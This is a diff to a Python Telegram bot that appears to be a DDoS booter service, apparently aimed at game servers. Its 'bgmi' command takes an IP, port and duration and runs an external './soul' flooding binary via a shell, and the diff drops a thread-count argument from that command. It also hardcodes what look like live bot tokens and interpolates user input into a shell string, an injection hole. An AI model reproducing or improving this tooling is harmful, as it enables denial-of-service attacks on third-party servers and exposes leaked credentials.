@@ -10,7 +10,7 @@ import random
 import string
 
 # Bot token
-BOT_TOKEN = '7960283920:AAGOQ40Bws6WAWxDwLkzT5eVoj1ioX7ozZU'  # Replace with your bot token
+BOT_TOKEN = '7047464931:AAHbXly04b6d1Chz_lolnkKBMb1aXi1UdoE'  # Replace with your bot token
 
 # Admin ID
 ADMIN_ID = 1944182800
@@ -689,9 +689,6 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Start the attack process
     asyncio.create_task(run_attack(ip, port, time_duration, update, user_id))
-    
-# Default thread value
-default_thread = "900"
 
 # Command to set thread dynamically
 async def set_thread(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -717,7 +714,7 @@ async def run_attack(ip, port, time_duration, update, user_id):
 
     try:
         # Simulate the attack command with dynamic thread
-        command = f"./soul {ip} {port} {time_duration} {default_thread}"
+        command = f"./soul {ip} {port} {time_duration}"
         process = subprocess.Popen(command, shell=True)
 
         # Wait for the specified duration
@@ -732,7 +729,6 @@ async def run_attack(ip, port, time_duration, update, user_id):
             f"🌐 *IP:* {ip}\n"
             f"🎯 *PORT:* {port}\n"
             f"⏳ *DURATION:* {time_duration} seconds\n"
-            f"💻 *Thread Used:* {default_thread}\n"
             f"👤 *User ID:* {user_id}\n\n"
             "💫 The owner of this bot is ❄️Daku Bhaiz❄️. Contact @DAKUBhaiZz.",
             parse_mode="Markdown",
